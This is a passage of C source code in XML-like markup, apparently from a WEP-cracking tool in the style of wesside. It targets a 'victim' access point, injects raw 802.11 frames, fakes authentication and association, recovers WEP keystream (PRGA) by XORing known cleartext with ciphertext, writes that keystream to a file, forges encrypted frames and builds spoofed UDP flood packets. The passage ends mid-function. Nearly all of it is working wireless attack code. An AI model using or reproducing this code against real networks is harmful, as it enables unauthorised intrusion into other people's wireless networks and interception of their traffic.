name|dlt
argument_list|)
operator|<
literal|0
condition|)
block|{
name|perror
argument_list|(
literal|"ioctl(BIOCSDLT)"
argument_list|)
expr_stmt|;
name|exit
argument_list|(
literal|1
argument_list|)
expr_stmt|;
block|}
name|i
operator|=
literal|1
expr_stmt|;
if|if
condition|(
name|ioctl
argument_list|(
name|fd
argument_list|,
name|BIOCIMMEDIATE
argument_list|,
operator|&
name|i
argument_list|)
operator|<
literal|0
condition|)
block|{
name|perror
argument_list|(
literal|"ioctl(BIOCIMMEDIATE)"
argument_list|)
expr_stmt|;
name|exit
argument_list|(
literal|1
argument_list|)
expr_stmt|;
block|}
return|return
name|fd
return|;
block|}
end_function

begin_function
name|void
name|hexdump
parameter_list|(
name|unsigned
name|char
modifier|*
name|ptr
parameter_list|,
name|int
name|len
parameter_list|)
block|{
while|while
condition|(
name|len
operator|>
literal|0
condition|)
block|{
name|printf
argument_list|(
literal|"%.2X "
argument_list|,
operator|*
name|ptr
argument_list|)
expr_stmt|;
name|ptr
operator|++
expr_stmt|;
name|len
operator|--
expr_stmt|;
block|}
name|printf
argument_list|(
literal|"\n"
argument_list|)
expr_stmt|;
block|}
end_function

begin_function
name|char
modifier|*
name|mac2str
parameter_list|(
name|unsigned
name|char
modifier|*
name|mac
parameter_list|)
block|{
specifier|static
name|char
name|ret
index|[
literal|6
operator|*
literal|3
index|]
decl_stmt|;
name|sprintf
argument_list|(
name|ret
argument_list|,
literal|"%.2X:%.2X:%.2X:%.2X:%.2X:%.2X"
argument_list|,
name|mac
index|[
literal|0
index|]
argument_list|,
name|mac
index|[
literal|1
index|]
argument_list|,
name|mac
index|[
literal|2
index|]
argument_list|,
name|mac
index|[
literal|3
index|]
argument_list|,
name|mac
index|[
literal|4
index|]
argument_list|,
name|mac
index|[
literal|5
index|]
argument_list|)
expr_stmt|;
return|return
name|ret
return|;
block|}
end_function

begin_function
name|void
name|inject
parameter_list|(
name|int
name|fd
parameter_list|,
name|void
modifier|*
name|buf
parameter_list|,
name|int
name|len
parameter_list|)
block|{
specifier|static
name|struct
name|ieee80211_bpf_params
name|params
init|=
block|{
operator|.
name|ibp_vers
operator|=
name|IEEE80211_BPF_VERSION
block|,
comment|/* NB: no need to pass series 2-4 rate+try */
operator|.
name|ibp_len
operator|=
sizeof|sizeof
argument_list|(
expr|struct
name|ieee80211_bpf_params
argument_list|)
operator|-
literal|6
block|,
operator|.
name|ibp_rate0
operator|=
literal|2
block|,
comment|/* 1 MB/s XXX */
operator|.
name|ibp_try0
operator|=
literal|1
block|,
comment|/* no retransmits */
operator|.
name|ibp_flags
operator|=
name|IEEE80211_BPF_NOACK
block|,
operator|.
name|ibp_power
operator|=
literal|100
block|,
comment|/* nominal max */
operator|.
name|ibp_pri
operator|=
name|WME_AC_VO
block|,
comment|/* high priority */
block|}
decl_stmt|;
name|struct
name|iovec
name|iov
index|[
literal|2
index|]
decl_stmt|;
name|int
name|rc
decl_stmt|;
name|iov
index|[
literal|0
index|]
operator|.
name|iov_base
operator|=
operator|&
name|params
expr_stmt|;
name|iov
index|[
literal|0
index|]
operator|.
name|iov_len
operator|=
name|params
operator|.
name|ibp_len
expr_stmt|;
name|iov
index|[
literal|1
index|]
operator|.
name|iov_base
operator|=
name|buf
expr_stmt|;
name|iov
index|[
literal|1
index|]
operator|.
name|iov_len
operator|=
name|len
expr_stmt|;
name|rc
operator|=
name|writev
argument_list|(
name|fd
argument_list|,
name|iov
argument_list|,
literal|2
argument_list|)
expr_stmt|;
if|if
condition|(
name|rc
operator|==
operator|-
literal|1
condition|)
block|{
name|perror
argument_list|(
literal|"writev()"
argument_list|)
expr_stmt|;
name|exit
argument_list|(
literal|1
argument_list|)
expr_stmt|;
block|}
if|if
condition|(
name|rc
operator|!=
operator|(
name|len
operator|+
name|iov
index|[
literal|0
index|]
operator|.
name|iov_len
operator|)
condition|)
block|{
name|time_print
argument_list|(
literal|"Error Wrote %d out of %d\n"
argument_list|,
name|rc
argument_list|,
name|len
operator|+
name|iov
index|[
literal|0
index|]
operator|.
name|iov_len
argument_list|)
expr_stmt|;
name|exit
argument_list|(
literal|1
argument_list|)
expr_stmt|;
block|}
block|}
end_function

begin_function
name|void
name|send_frame
parameter_list|(
name|int
name|tx
parameter_list|,
name|unsigned
name|char
modifier|*
name|buf
parameter_list|,
name|int
name|len
parameter_list|)
block|{
specifier|static
name|unsigned
name|char
modifier|*
name|lame
init|=
literal|0
decl_stmt|;
specifier|static
name|int
name|lamelen
init|=
literal|0
decl_stmt|;
specifier|static
name|int
name|lastlen
init|=
literal|0
decl_stmt|;
comment|// retransmit!
if|if
condition|(
name|len
operator|==
operator|-
literal|1
condition|)
block|{
name|txstate
operator|.
name|retries
operator|++
expr_stmt|;
if|if
condition|(
name|txstate
operator|.
name|retries
operator|>
literal|10
condition|)
block|{
name|time_print
argument_list|(
literal|"ERROR Max retransmists for (%d bytes):\n"
argument_list|,
name|lastlen
argument_list|)
expr_stmt|;
name|hexdump
argument_list|(
operator|&
name|lame
index|[
literal|0
index|]
argument_list|,
name|lastlen
argument_list|)
expr_stmt|;
comment|//			exit(1);
block|}
name|len
operator|=
name|lastlen
expr_stmt|;
comment|//		printf("Warning doing a retransmit...\n");
block|}
comment|// normal tx
else|else
block|{
name|assert
argument_list|(
operator|!
name|txstate
operator|.
name|waiting_ack
argument_list|)
expr_stmt|;
if|if
condition|(
name|len
operator|>
name|lamelen
condition|)
block|{
if|if
condition|(
name|lame
condition|)
name|free
argument_list|(
name|lame
argument_list|)
expr_stmt|;
name|lame
operator|=
operator|(
name|unsigned
name|char
operator|*
operator|)
name|malloc
argument_list|(
name|len
argument_list|)
expr_stmt|;
if|if
condition|(
operator|!
name|lame
condition|)
block|{
name|perror
argument_list|(
literal|"malloc()"
argument_list|)
expr_stmt|;
name|exit
argument_list|(
literal|1
argument_list|)
expr_stmt|;
block|}
name|lamelen
operator|=
name|len
expr_stmt|;
block|}
name|memcpy
argument_list|(
name|lame
argument_list|,
name|buf
argument_list|,
name|len
argument_list|)
expr_stmt|;
name|txstate
operator|.
name|retries
operator|=
literal|0
expr_stmt|;
name|lastlen
operator|=
name|len
expr_stmt|;
block|}
name|inject
argument_list|(
name|tx
argument_list|,
name|lame
argument_list|,
name|len
argument_list|)
expr_stmt|;
name|txstate
operator|.
name|waiting_ack
operator|=
literal|1
expr_stmt|;
name|txstate
operator|.
name|psent
operator|++
expr_stmt|;
if|if
condition|(
name|gettimeofday
argument_list|(
operator|&
name|txstate
operator|.
name|tsent
argument_list|,
name|NULL
argument_list|)
operator|==
operator|-
literal|1
condition|)
block|{
name|perror
argument_list|(
literal|"gettimeofday()"
argument_list|)
expr_stmt|;
name|exit
argument_list|(
literal|1
argument_list|)
expr_stmt|;
block|}
if|#
directive|if
literal|0
block|printf("Wrote frame at %lu.%lu\n",  	       txstate.tsent.tv_sec, txstate.tsent.tv_usec);
endif|#
directive|endif
block|}
end_function

begin_function
name|unsigned
name|short
name|fnseq
parameter_list|(
name|unsigned
name|short
name|fn
parameter_list|,
name|unsigned
name|short
name|seq
parameter_list|)
block|{
name|unsigned
name|short
name|r
init|=
literal|0
decl_stmt|;
if|if
condition|(
name|fn
operator|>
literal|15
condition|)
block|{
name|time_print
argument_list|(
literal|"too many fragments (%d)\n"
argument_list|,
name|fn
argument_list|)
expr_stmt|;
name|exit
argument_list|(
literal|1
argument_list|)
expr_stmt|;
block|}
name|r
operator|=
name|fn
expr_stmt|;
name|r
operator||=
operator|(
operator|(
name|seq
operator|%
literal|4096
operator|)
operator|<<
name|IEEE80211_SEQ_SEQ_SHIFT
operator|)
expr_stmt|;
return|return
name|r
return|;
block|}
end_function

begin_function
name|void
name|fill_basic
parameter_list|(
name|struct
name|ieee80211_frame
modifier|*
name|wh
parameter_list|)
block|{
name|unsigned
name|short
modifier|*
name|sp
decl_stmt|;
name|memcpy
argument_list|(
name|wh
operator|->
name|i_addr1
argument_list|,
name|victim
operator|.
name|bss
argument_list|,
literal|6
argument_list|)
expr_stmt|;
name|memcpy
argument_list|(
name|wh
operator|->
name|i_addr2
argument_list|,
name|mymac
argument_list|,
literal|6
argument_list|)
expr_stmt|;
name|memcpy
argument_list|(
name|wh
operator|->
name|i_addr3
argument_list|,
name|victim
operator|.
name|bss
argument_list|,
literal|6
argument_list|)
expr_stmt|;
name|sp
operator|=
operator|(
name|unsigned
name|short
operator|*
operator|)
name|wh
operator|->
name|i_seq
expr_stmt|;
operator|*
name|sp
operator|=
name|fnseq
argument_list|(
literal|0
argument_list|,
name|txstate
operator|.
name|psent
argument_list|)
expr_stmt|;
name|sp
operator|=
operator|(
name|unsigned
name|short
operator|*
operator|)
name|wh
operator|->
name|i_dur
expr_stmt|;
operator|*
name|sp
operator|=
name|htole16
argument_list|(
literal|32767
argument_list|)
expr_stmt|;
block|}
end_function

begin_function
name|void
name|send_assoc
parameter_list|(
name|int
name|tx
parameter_list|)
block|{
name|unsigned
name|char
name|buf
index|[
literal|128
index|]
decl_stmt|;
name|struct
name|ieee80211_frame
modifier|*
name|wh
init|=
operator|(
expr|struct
name|ieee80211_frame
operator|*
operator|)
name|buf
decl_stmt|;
name|unsigned
name|char
modifier|*
name|body
decl_stmt|;
name|int
name|ssidlen
decl_stmt|;
name|memset
argument_list|(
name|buf
argument_list|,
literal|0
argument_list|,
sizeof|sizeof
argument_list|(
name|buf
argument_list|)
argument_list|)
expr_stmt|;
name|fill_basic
argument_list|(
name|wh
argument_list|)
expr_stmt|;
name|wh
operator|->
name|i_fc
index|[
literal|0
index|]
operator||=
name|IEEE80211_FC0_TYPE_MGT
operator||
name|IEEE80211_FC0_SUBTYPE_ASSOC_REQ
expr_stmt|;
name|body
operator|=
operator|(
name|unsigned
name|char
operator|*
operator|)
name|wh
operator|+
sizeof|sizeof
argument_list|(
operator|*
name|wh
argument_list|)
expr_stmt|;
operator|*
name|body
operator|=
literal|1
operator||
name|IEEE80211_CAPINFO_PRIVACY
expr_stmt|;
comment|// cap
comment|// cap + interval
name|body
operator|+=
literal|2
operator|+
literal|2
expr_stmt|;
comment|// ssid
operator|*
name|body
operator|++
operator|=
literal|0
expr_stmt|;
name|ssidlen
operator|=
name|strlen
argument_list|(
name|victim
operator|.
name|ssid
argument_list|)
expr_stmt|;
operator|*
name|body
operator|++
operator|=
name|ssidlen
expr_stmt|;
name|memcpy
argument_list|(
name|body
argument_list|,
name|victim
operator|.
name|ssid
argument_list|,
name|ssidlen
argument_list|)
expr_stmt|;
name|body
operator|+=
name|ssidlen
expr_stmt|;
comment|// rates
operator|*
name|body
operator|++
operator|=
literal|1
expr_stmt|;
operator|*
name|body
operator|++
operator|=
literal|4
expr_stmt|;
operator|*
name|body
operator|++
operator|=
literal|2
expr_stmt|;
operator|*
name|body
operator|++
operator|=
literal|4
expr_stmt|;
operator|*
name|body
operator|++
operator|=
literal|11
expr_stmt|;
operator|*
name|body
operator|++
operator|=
literal|22
expr_stmt|;
name|send_frame
argument_list|(
name|tx
argument_list|,
name|buf
argument_list|,
sizeof|sizeof
argument_list|(
operator|*
name|wh
argument_list|)
operator|+
literal|2
operator|+
literal|2
operator|+
literal|2
operator|+
name|strlen
argument_list|(
name|victim
operator|.
name|ssid
argument_list|)
operator|+
literal|2
operator|+
literal|4
argument_list|)
expr_stmt|;
block|}
end_function

begin_function
name|void
name|wepify
parameter_list|(
name|unsigned
name|char
modifier|*
name|body
parameter_list|,
name|int
name|dlen
parameter_list|)
block|{
name|uLong
name|crc
decl_stmt|;
name|unsigned
name|long
modifier|*
name|pcrc
decl_stmt|;
name|int
name|i
decl_stmt|;
name|assert
argument_list|(
name|dlen
operator|+
literal|4
operator|<=
name|prgainfo
operator|.
name|len
argument_list|)
expr_stmt|;
comment|// iv
name|memcpy
argument_list|(
name|body
argument_list|,
name|prgainfo
operator|.
name|iv
argument_list|,
literal|3
argument_list|)
expr_stmt|;
name|body
operator|+=
literal|3
expr_stmt|;
operator|*
name|body
operator|++
operator|=
literal|0
expr_stmt|;
comment|// crc
name|crc
operator|=
name|crc32
argument_list|(
literal|0L
argument_list|,
name|Z_NULL
argument_list|,
literal|0
argument_list|)
expr_stmt|;
name|crc
operator|=
name|crc32
argument_list|(
name|crc
argument_list|,
name|body
argument_list|,
name|dlen
argument_list|)
expr_stmt|;
name|pcrc
operator|=
operator|(
name|unsigned
name|long
operator|*
operator|)
operator|(
name|body
operator|+
name|dlen
operator|)
expr_stmt|;
operator|*
name|pcrc
operator|=
name|crc
expr_stmt|;
for|for
control|(
name|i
operator|=
literal|0
init|;
name|i
operator|<
name|dlen
operator|+
literal|4
condition|;
name|i
operator|++
control|)
operator|*
name|body
operator|++
operator|^=
name|prgainfo
operator|.
name|prga
index|[
name|i
index|]
expr_stmt|;
block|}
end_function

begin_function
name|void
name|send_auth
parameter_list|(
name|int
name|tx
parameter_list|)
block|{
name|unsigned
name|char
name|buf
index|[
literal|128
index|]
decl_stmt|;
name|struct
name|ieee80211_frame
modifier|*
name|wh
init|=
operator|(
expr|struct
name|ieee80211_frame
operator|*
operator|)
name|buf
decl_stmt|;
name|unsigned
name|short
modifier|*
name|n
decl_stmt|;
name|memset
argument_list|(
name|buf
argument_list|,
literal|0
argument_list|,
sizeof|sizeof
argument_list|(
name|buf
argument_list|)
argument_list|)
expr_stmt|;
name|fill_basic
argument_list|(
name|wh
argument_list|)
expr_stmt|;
name|wh
operator|->
name|i_fc
index|[
literal|0
index|]
operator||=
name|IEEE80211_FC0_TYPE_MGT
operator||
name|IEEE80211_FC0_SUBTYPE_AUTH
expr_stmt|;
name|n
operator|=
operator|(
name|unsigned
name|short
operator|*
operator|)
operator|(
operator|(
name|unsigned
name|char
operator|*
operator|)
name|wh
operator|+
sizeof|sizeof
argument_list|(
operator|*
name|wh
argument_list|)
operator|)
expr_stmt|;
name|n
operator|++
expr_stmt|;
operator|*
name|n
operator|=
literal|1
expr_stmt|;
name|send_frame
argument_list|(
name|tx
argument_list|,
name|buf
argument_list|,
sizeof|sizeof
argument_list|(
operator|*
name|wh
argument_list|)
operator|+
literal|2
operator|+
literal|2
operator|+
literal|2
argument_list|)
expr_stmt|;
block|}
end_function

begin_function
name|int
name|get_victim_ssid
parameter_list|(
name|struct
name|ieee80211_frame
modifier|*
name|wh
parameter_list|,
name|int
name|len
parameter_list|)
block|{
name|unsigned
name|char
modifier|*
name|ptr
decl_stmt|;
name|int
name|x
decl_stmt|;
name|int
name|gots
init|=
literal|0
decl_stmt|,
name|gotc
init|=
literal|0
decl_stmt|;
if|if
condition|(
name|len
operator|<=
sizeof|sizeof
argument_list|(
operator|*
name|wh
argument_list|)
condition|)
block|{
name|time_print
argument_list|(
literal|"Warning: short packet in get_victim_ssid()\n"
argument_list|)
expr_stmt|;
return|return
literal|0
return|;
block|}
name|ptr
operator|=
operator|(
name|unsigned
name|char
operator|*
operator|)
name|wh
operator|+
sizeof|sizeof
argument_list|(
operator|*
name|wh
argument_list|)
expr_stmt|;
name|len
operator|-=
sizeof|sizeof
argument_list|(
operator|*
name|wh
argument_list|)
expr_stmt|;
comment|// only wep baby
if|if
condition|(
operator|!
operator|(
name|IEEE80211_BEACON_CAPABILITY
argument_list|(
name|ptr
argument_list|)
operator|&
name|IEEE80211_CAPINFO_PRIVACY
operator|)
condition|)
block|{
return|return
literal|0
return|;
block|}
comment|// we want a specific victim
if|if
condition|(
name|victim_mac
condition|)
block|{
if|if
condition|(
name|memcmp
argument_list|(
name|wh
operator|->
name|i_addr3
argument_list|,
name|victim_mac
argument_list|,
literal|6
argument_list|)
operator|!=
literal|0
condition|)
return|return
literal|0
return|;
block|}
comment|// beacon header
name|x
operator|=
literal|8
operator|+
literal|2
operator|+
literal|2
expr_stmt|;
if|if
condition|(
name|len
operator|<=
name|x
condition|)
block|{
name|time_print
argument_list|(
literal|"Warning short.asdfasdf\n"
argument_list|)
expr_stmt|;
return|return
literal|0
return|;
block|}
name|ptr
operator|+=
name|x
expr_stmt|;
name|len
operator|-=
name|x
expr_stmt|;
comment|// SSID
while|while
condition|(
name|len
operator|>
literal|2
condition|)
block|{
name|int
name|eid
decl_stmt|,
name|elen
decl_stmt|;
name|eid
operator|=
operator|*
name|ptr
expr_stmt|;
name|ptr
operator|++
expr_stmt|;
name|elen
operator|=
operator|*
name|ptr
expr_stmt|;
name|ptr
operator|++
expr_stmt|;
name|len
operator|-=
literal|2
expr_stmt|;
if|if
condition|(
name|len
operator|<
name|elen
condition|)
block|{
name|time_print
argument_list|(
literal|"Warning short....\n"
argument_list|)
expr_stmt|;
return|return
literal|0
return|;
block|}
comment|// ssid
if|if
condition|(
name|eid
operator|==
literal|0
condition|)
block|{
if|if
condition|(
name|victim
operator|.
name|ssid
condition|)
name|free
argument_list|(
name|victim
operator|.
name|ssid
argument_list|)
expr_stmt|;
name|victim
operator|.
name|ssid
operator|=
operator|(
name|char
operator|*
operator|)
name|malloc
argument_list|(
name|elen
operator|+
literal|1
argument_list|)
expr_stmt|;
if|if
condition|(
operator|!
name|victim
operator|.
name|ssid
condition|)
block|{
name|perror
argument_list|(
literal|"malloc()"
argument_list|)
expr_stmt|;
name|exit
argument_list|(
literal|1
argument_list|)
expr_stmt|;
block|}
name|memcpy
argument_list|(
name|victim
operator|.
name|ssid
argument_list|,
name|ptr
argument_list|,
name|elen
argument_list|)
expr_stmt|;
name|victim
operator|.
name|ssid
index|[
name|elen
index|]
operator|=
literal|0
expr_stmt|;
name|gots
operator|=
literal|1
expr_stmt|;
block|}
comment|// chan
elseif|else
if|if
condition|(
name|eid
operator|==
literal|3
condition|)
block|{
if|if
condition|(
name|elen
operator|!=
literal|1
condition|)
block|{
name|time_print
argument_list|(
literal|"Warning len of chan not 1\n"
argument_list|)
expr_stmt|;
return|return
literal|0
return|;
block|}
name|victim
operator|.
name|chan
operator|=
operator|*
name|ptr
expr_stmt|;
name|gotc
operator|=
literal|1
expr_stmt|;
block|}
name|ptr
operator|+=
name|elen
expr_stmt|;
name|len
operator|-=
name|elen
expr_stmt|;
block|}
if|if
condition|(
name|gots
operator|&&
name|gotc
condition|)
block|{
name|memcpy
argument_list|(
name|victim
operator|.
name|bss
argument_list|,
name|wh
operator|->
name|i_addr3
argument_list|,
literal|6
argument_list|)
expr_stmt|;
name|set_chan
argument_list|(
name|victim
operator|.
name|chan
argument_list|)
expr_stmt|;
name|state
operator|=
name|FOUND_VICTIM
expr_stmt|;
name|time_print
argument_list|(
literal|"Found SSID(%s) BSS=(%s) chan=%d\n"
argument_list|,
name|victim
operator|.
name|ssid
argument_list|,
name|mac2str
argument_list|(
name|victim
operator|.
name|bss
argument_list|)
argument_list|,
name|victim
operator|.
name|chan
argument_list|)
expr_stmt|;
return|return
literal|1
return|;
block|}
return|return
literal|0
return|;
block|}
end_function

begin_function
name|void
name|send_ack
parameter_list|(
name|int
name|tx
parameter_list|)
block|{
comment|/* firmware acks */
block|}
end_function

begin_function
name|void
name|do_llc
parameter_list|(
name|unsigned
name|char
modifier|*
name|buf
parameter_list|,
name|unsigned
name|short
name|type
parameter_list|)
block|{
name|struct
name|llc
modifier|*
name|h
init|=
operator|(
expr|struct
name|llc
operator|*
operator|)
name|buf
decl_stmt|;
name|memset
argument_list|(
name|h
argument_list|,
literal|0
argument_list|,
sizeof|sizeof
argument_list|(
operator|*
name|h
argument_list|)
argument_list|)
expr_stmt|;
name|h
operator|->
name|llc_dsap
operator|=
name|LLC_SNAP_LSAP
expr_stmt|;
name|h
operator|->
name|llc_ssap
operator|=
name|LLC_SNAP_LSAP
expr_stmt|;
name|h
operator|->
name|llc_un
operator|.
name|type_snap
operator|.
name|control
operator|=
literal|3
expr_stmt|;
name|h
operator|->
name|llc_un
operator|.
name|type_snap
operator|.
name|ether_type
operator|=
name|htons
argument_list|(
name|type
argument_list|)
expr_stmt|;
block|}
end_function

begin_function
name|void
name|calculate_inet_clear
parameter_list|()
block|{
name|struct
name|ip
modifier|*
name|ih
decl_stmt|;
name|struct
name|udphdr
modifier|*
name|uh
decl_stmt|;
name|uLong
name|crc
decl_stmt|;
name|unsigned
name|long
modifier|*
name|pcrc
decl_stmt|;
name|int
name|dlen
decl_stmt|;
name|memset
argument_list|(
name|inet_clear
argument_list|,
literal|0
argument_list|,
sizeof|sizeof
argument_list|(
name|inet_clear
argument_list|)
argument_list|)
expr_stmt|;
name|do_llc
argument_list|(
name|inet_clear
argument_list|,
name|ETHERTYPE_IP
argument_list|)
expr_stmt|;
name|ih
operator|=
operator|(
expr|struct
name|ip
operator|*
operator|)
operator|&
name|inet_clear
index|[
literal|8
index|]
expr_stmt|;
name|ih
operator|->
name|ip_hl
operator|=
literal|5
expr_stmt|;
name|ih
operator|->
name|ip_v
operator|=
literal|4
expr_stmt|;
name|ih
operator|->
name|ip_tos
operator|=
literal|0
expr_stmt|;
name|ih
operator|->
name|ip_len
operator|=
name|htons
argument_list|(
literal|20
operator|+
literal|8
operator|+
name|PRGA_LEN
argument_list|)
expr_stmt|;
name|ih
operator|->
name|ip_id
operator|=
name|htons
argument_list|(
literal|666
argument_list|)
expr_stmt|;
name|ih
operator|->
name|ip_off
operator|=
literal|0
expr_stmt|;
name|ih
operator|->
name|ip_ttl
operator|=
name|ttl_val
expr_stmt|;
name|ih
operator|->
name|ip_p
operator|=
name|IPPROTO_UDP
expr_stmt|;
name|ih
operator|->
name|ip_sum
operator|=
literal|0
expr_stmt|;
name|inet_aton
argument_list|(
name|floodip
argument_list|,
operator|&
name|ih
operator|->
name|ip_src
argument_list|)
expr_stmt|;
name|inet_aton
argument_list|(
name|myip
argument_list|,
operator|&
name|ih
operator|->
name|ip_dst
argument_list|)
expr_stmt|;
name|ih
operator|->
name|ip_sum
operator|=
name|in_cksum
argument_list|(
operator|(
name|unsigned
name|short
operator|*
operator|)
name|ih
argument_list|,
literal|20
argument_list|)
expr_stmt|;
name|uh
operator|=
operator|(
expr|struct
name|udphdr
operator|*
operator|)
operator|(
operator|(
name|char
operator|*
operator|)
name|ih
operator|+
literal|20
operator|)
expr_stmt|;
name|uh
operator|->
name|uh_sport
operator|=
name|htons
argument_list|(
name|floodport
argument_list|)
expr_stmt|;
name|uh
operator|->
name|uh_dport
operator|=
name|htons
argument_list|(
name|floodsport
argument_list|)
expr_stmt|;
name|uh
operator|->
name|uh_ulen
operator|=
name|htons
argument_list|(
literal|8
operator|+
name|PRGA_LEN
argument_list|)
expr_stmt|;
name|uh
operator|->
name|uh_sum
operator|=
literal|0
expr_stmt|;
name|uh
operator|->
name|uh_sum
operator|=
name|udp_checksum
argument_list|(
operator|(
name|unsigned
name|char
operator|*
operator|)
name|uh
argument_list|,
literal|8
operator|+
name|PRGA_LEN
argument_list|,
operator|&
name|ih
operator|->
name|ip_src
argument_list|,
operator|&
name|ih
operator|->
name|ip_dst
argument_list|)
expr_stmt|;
comment|// crc
name|dlen
operator|=
literal|8
operator|+
literal|20
operator|+
literal|8
operator|+
name|PRGA_LEN
expr_stmt|;
name|assert
argument_list|(
name|dlen
operator|+
literal|4
operator|<=
sizeof|sizeof
argument_list|(
name|inet_clear
argument_list|)
argument_list|)
expr_stmt|;
name|crc
operator|=
name|crc32
argument_list|(
literal|0L
argument_list|,
name|Z_NULL
argument_list|,
literal|0
argument_list|)
expr_stmt|;
name|crc
operator|=
name|crc32
argument_list|(
name|crc
argument_list|,
name|inet_clear
argument_list|,
name|dlen
argument_list|)
expr_stmt|;
name|pcrc
operator|=
operator|(
name|unsigned
name|long
operator|*
operator|)
operator|(
name|inet_clear
operator|+
name|dlen
operator|)
expr_stmt|;
operator|*
name|pcrc
operator|=
name|crc
expr_stmt|;
if|#
directive|if
literal|0
block|printf("INET %d\n", sizeof(inet_clear)); 	hexdump(inet_clear, sizeof(inet_clear));
endif|#
directive|endif
block|}
end_function

begin_function
name|void
name|set_prga
parameter_list|(
name|unsigned
name|char
modifier|*
name|iv
parameter_list|,
name|unsigned
name|char
modifier|*
name|cipher
parameter_list|,
name|unsigned
name|char
modifier|*
name|clear
parameter_list|,
name|int
name|len
parameter_list|)
block|{
name|int
name|i
decl_stmt|;
name|int
name|fd
decl_stmt|;
if|if
condition|(
name|prgainfo
operator|.
name|len
operator|!=
literal|0
condition|)
name|free
argument_list|(
name|prgainfo
operator|.
name|prga
argument_list|)
expr_stmt|;
name|prgainfo
operator|.
name|prga
operator|=
operator|(
name|unsigned
name|char
operator|*
operator|)
name|malloc
argument_list|(
name|len
argument_list|)
expr_stmt|;
if|if
condition|(
operator|!
name|prgainfo
operator|.
name|prga
condition|)
block|{
name|perror
argument_list|(
literal|"malloc()"
argument_list|)
expr_stmt|;
name|exit
argument_list|(
literal|1
argument_list|)
expr_stmt|;
block|}
name|prgainfo
operator|.
name|len
operator|=
name|len
expr_stmt|;
name|memcpy
argument_list|(
name|prgainfo
operator|.
name|iv
argument_list|,
name|iv
argument_list|,
literal|3
argument_list|)
expr_stmt|;
for|for
control|(
name|i
operator|=
literal|0
init|;
name|i
operator|<
name|len
condition|;
name|i
operator|++
control|)
block|{
name|prgainfo
operator|.
name|prga
index|[
name|i
index|]
operator|=
operator|(
name|cipher
condition|?
operator|(
name|clear
index|[
name|i
index|]
operator|^
name|cipher
index|[
name|i
index|]
operator|)
else|:
name|clear
index|[
name|i
index|]
operator|)
expr_stmt|;
block|}
name|time_print
argument_list|(
literal|"Got %d bytes of prga IV=(%.02x:%.02x:%.02x) PRGA="
argument_list|,
name|prgainfo
operator|.
name|len
argument_list|,
name|prgainfo
operator|.
name|iv
index|[
literal|0
index|]
argument_list|,
name|prgainfo
operator|.
name|iv
index|[
literal|1
index|]
argument_list|,
name|prgainfo
operator|.
name|iv
index|[
literal|2
index|]
argument_list|)
expr_stmt|;
name|hexdump
argument_list|(
name|prgainfo
operator|.
name|prga
argument_list|,
name|prgainfo
operator|.
name|len
argument_list|)
expr_stmt|;
if|if
condition|(
operator|!
name|cipher
condition|)
return|return;
name|fd
operator|=
name|open
argument_list|(
name|PRGA_FILE
argument_list|,
name|O_WRONLY
operator||
name|O_CREAT
argument_list|,
name|S_IRUSR
operator||
name|S_IWUSR
operator||
name|S_IRGRP
operator||
name|S_IROTH
argument_list|)
expr_stmt|;
if|if
condition|(
name|fd
operator|==
operator|-
literal|1
condition|)
block|{
name|perror
argument_list|(
literal|"open()"
argument_list|)
expr_stmt|;
name|exit
argument_list|(
literal|1
argument_list|)
expr_stmt|;
block|}
name|i
operator|=
name|write
argument_list|(
name|fd
argument_list|,
name|prgainfo
operator|.
name|iv
argument_list|,
literal|3
argument_list|)
expr_stmt|;
if|if
condition|(
name|i
operator|==
operator|-
literal|1
condition|)
block|{
name|perror
argument_list|(
literal|"write()"
argument_list|)
expr_stmt|;
name|exit
argument_list|(
literal|1
argument_list|)
expr_stmt|;
block|}
if|if
condition|(
name|i
operator|!=
literal|3
condition|)
block|{
name|printf
argument_list|(
literal|"Wrote %d out of %d\n"
argument_list|,
name|i
argument_list|,
literal|3
argument_list|)
expr_stmt|;
name|exit
argument_list|(
literal|1
argument_list|)
expr_stmt|;
block|}
name|i
operator|=
name|write
argument_list|(
name|fd
argument_list|,
name|prgainfo
operator|.
name|prga
argument_list|,
name|prgainfo
operator|.
name|len
argument_list|)
expr_stmt|;
if|if
condition|(
name|i
operator|==
operator|-
literal|1
condition|)
block|{
name|perror
argument_list|(
literal|"write()"
argument_list|)
expr_stmt|;
name|exit
argument_list|(
literal|1
argument_list|)
expr_stmt|;
block|}
if|if
condition|(
name|i
operator|!=
name|prgainfo
operator|.
name|len
condition|)
block|{
name|printf
argument_list|(
literal|"Wrote %d out of %d\n"
argument_list|,
name|i
argument_list|,
name|prgainfo
operator|.
name|len
argument_list|)
expr_stmt|;
name|exit
argument_list|(
literal|1
argument_list|)
expr_stmt|;
block|}
name|close
argument_list|(
name|fd
argument_list|)
expr_stmt|;
block|}
end_function

begin_function
name|void
name|log_dictionary
parameter_list|(
name|unsigned
name|char
modifier|*
name|body
parameter_list|,
name|int
name|len
parameter_list|)
block|{
name|char
name|paths
index|[
literal|3
index|]
index|[
literal|3
index|]
decl_stmt|;
name|int
name|i
decl_stmt|,
name|rd
decl_stmt|;
name|int
name|fd
decl_stmt|;
name|unsigned
name|char
name|path
index|[
literal|128
index|]
decl_stmt|;
name|unsigned
name|char
name|file_clear
index|[
sizeof|sizeof
argument_list|(
name|inet_clear
argument_list|)
index|]
decl_stmt|;
name|unsigned
name|char
modifier|*
name|data
decl_stmt|;
name|len
operator|-=
literal|4
expr_stmt|;
comment|// IV etc..
name|assert
argument_list|(
name|len
operator|==
sizeof|sizeof
argument_list|(
name|inet_clear
argument_list|)
argument_list|)
expr_stmt|;
name|data
operator|=
name|body
operator|+
literal|4
expr_stmt|;
if|if
condition|(
name|len
operator|>
name|prgainfo
operator|.
name|len
condition|)
name|set_prga
argument_list|(
name|body
argument_list|,
name|data
argument_list|,
name|inet_clear
argument_list|,
name|len
argument_list|)
expr_stmt|;
for|for
control|(
name|i
operator|=
literal|0
init|;
name|i
operator|<
literal|3
condition|;
name|i
operator|++
control|)
name|snprintf
argument_list|(
name|paths
index|[
name|i
index|]
argument_list|,
sizeof|sizeof
argument_list|(
name|paths
index|[
name|i
index|]
argument_list|)
argument_list|,
literal|"%.2X"
argument_list|,
name|body
index|[
name|i
index|]
argument_list|)
expr_stmt|;
name|strcpy
argument_list|(
name|path
argument_list|,
name|DICT_PATH
argument_list|)
expr_stmt|;
comment|// first 2 bytes
for|for
control|(
name|i
operator|=
literal|0
init|;
name|i
operator|<
literal|2
condition|;
name|i
operator|++
control|)
block|{
name|strcat
argument_list|(
name|path
argument_list|,
literal|"/"
argument_list|)
expr_stmt|;
name|strcat
argument_list|(
name|path
argument_list|,
name|paths
index|[
name|i
index|]
argument_list|)
